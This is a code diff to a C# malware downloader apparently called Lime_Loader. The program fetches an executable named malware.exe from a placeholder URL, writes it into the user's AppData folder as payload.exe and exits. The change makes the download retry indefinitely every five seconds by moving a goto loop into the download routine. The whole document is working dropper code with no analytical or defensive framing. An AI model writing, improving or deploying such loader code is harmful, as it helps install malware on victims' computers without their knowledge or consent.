@@ -20,17 +20,10 @@ namespace Lime_Loader
     {
 
 
-       public static void Main()
+        public static void Main()
         {
 
-        redownload:
             byte[] payloadBuffer = DownloadPayload(@"http://127.0.0.1/malware.exe");
-
-            if (payloadBuffer == null)
-            {
-                Thread.Sleep(10 * 1000);
-                goto redownload;
-            }
 
             if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\payload.exe"))
                 Environment.Exit(0);
@@ -68,17 +61,28 @@ namespace Lime_Loader
 
         private static byte[] DownloadPayload(string url)
         {
-            using (WebClient wc = new WebClient())
+        redownload:
+            try
             {
-                try
+                HttpWebRequest httpRequest = (HttpWebRequest)WebRequest.Create(url);
+                httpRequest.Method = WebRequestMethods.Http.Get;
+                HttpWebResponse httpResponse = (HttpWebResponse)httpRequest.GetResponse();
+                Stream httpResponseStream = httpResponse.GetResponseStream();
+
+                using (MemoryStream memoryStream = new MemoryStream())
                 {
-                    return wc.DownloadData(url);
-                }
-                catch
-                {
-                    return null;
+                    httpResponseStream.CopyTo(memoryStream);
+                    httpResponse.Close();
+                    httpResponseStream.Dispose();
+                    return memoryStream.ToArray();
                 }
             }
+            catch
+            {
+                Thread.Sleep(5000);
+                goto redownload;
+            }
+
         }
 
 
